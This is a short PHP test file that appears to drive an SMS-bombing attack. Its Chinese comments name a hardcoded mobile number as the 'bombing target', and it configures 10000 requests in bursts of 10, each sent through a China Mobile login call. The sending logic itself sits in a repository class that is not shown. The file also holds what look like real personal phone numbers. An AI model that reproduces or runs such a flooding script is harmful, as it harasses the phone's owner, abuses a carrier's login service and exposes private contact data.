<?php
namespace tests\Once;

use App\Helpers\CurlRequest;
use LogService;
use App\Repositories\Destory\DestoryRepository;


class DestoryMobileTest extends \TestCase
{
    const REQUEST_TIME = 10000; // 单次请求总数
    const FREQUENCE    = 10; // 连续请求次数
    const SLEEP_PER    = 3; // 每次连续请求后，等待时长

    const TARGET_MOBILE = '13752869735'; // 轰炸目标，手机号，移动号码
    // const TARGET_MOBILE = '17854298547'; // 轰炸目标，手机号，移动号码

    /**
     * 本地一次性执行，然后批量把数据导入到线上
     */
    public function test_run()
    {
        LogService::info(__CLASS__ . '@' . __FUNCTION__ . '.start');

        DestoryRepository::china_mobile_login(self::TARGET_MOBILE);
        LogService::info(__CLASS__ . '@' . __FUNCTION__ . '.end');
    }

}
